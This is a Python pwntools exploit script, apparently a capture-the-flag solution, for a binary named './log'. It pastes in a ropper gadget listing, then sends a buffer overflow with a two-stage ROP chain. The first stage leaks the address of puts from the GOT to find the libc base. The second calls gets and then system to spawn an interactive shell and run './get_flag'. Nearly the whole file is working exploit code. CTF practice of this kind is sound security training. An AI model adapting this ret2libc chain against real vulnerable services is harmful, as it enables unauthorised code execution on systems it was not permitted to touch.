#!/usr/bin/python
from pwn import *
import sys

config = {
    "elf" : "./log",
    "libc" : "./libc-2.31.so",
    "HOST" : "0",
    "PORT" : 31338
}

"""
$ ropper --file ./log --search "pop"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: ./log
0x000000000040142c: pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040142e: pop r13; pop r14; pop r15; ret; 
0x0000000000401430: pop r14; pop r15; ret; 
0x0000000000401432: pop r15; ret; 
0x000000000040142b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040142f: pop rbp; pop r14; pop r15; ret; 
0x000000000040121d: pop rbp; ret; 
0x0000000000401433: pop rdi; ret; 
0x0000000000401431: pop rsi; pop r15; ret; 
0x000000000040142d: pop rsp; pop r13; pop r14; pop r15; ret; 
"""

def exploit(r):
    rdi = lambda x : p64(0x0000000000401433)+p64(x)

    rop = "IDIOT".ljust(8, '\x00')
    rop+= "A"*277
    rop+= rdi(e.got["puts"])
    rop+= p64(e.symbols["puts"])
    rop+= p64(e.symbols["main"])
    sleep(0.1)
    r.sendline(rop)

    libc_base = u64(r.recvuntil("\n").rstrip().ljust(8, '\x00'))-libc.symbols["puts"]
    log.info("libc_base: {:#x}".format(libc_base))

    system = libc_base + libc.symbols["system"]
    exit = libc_base + libc.symbols["exit"]
    rop = "IDIOT".ljust(8, '\x00')
    rop+= "A"*277
    rop+= rdi(0x0000000000404800)
    rop+= p64(e.symbols["gets"])
    rop+= rdi(0x0000000000404800)
    rop+= p64(system)
    rop+= p64(exit)
    sleep(0.1)
    r.sendline(rop)

    sleep(0.1)
    r.sendline("./get_flag")

    r.interactive()
    return

if __name__ == "__main__":
    if "elf" in config.keys() and config["elf"]:
        e = ELF(config["elf"])
    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    if "remote" in sys.argv:
        r = remote(config["HOST"], config["PORT"])
    else:
        if "libc" in dir():
            r = process(config["elf"], env={"LD_PRELOAD" : config["libc"]})
        else:
            r = process(config["elf"])

        print util.proc.pidof(r)
        if "debug" in sys.argv:
            pause()

    exploit(r)
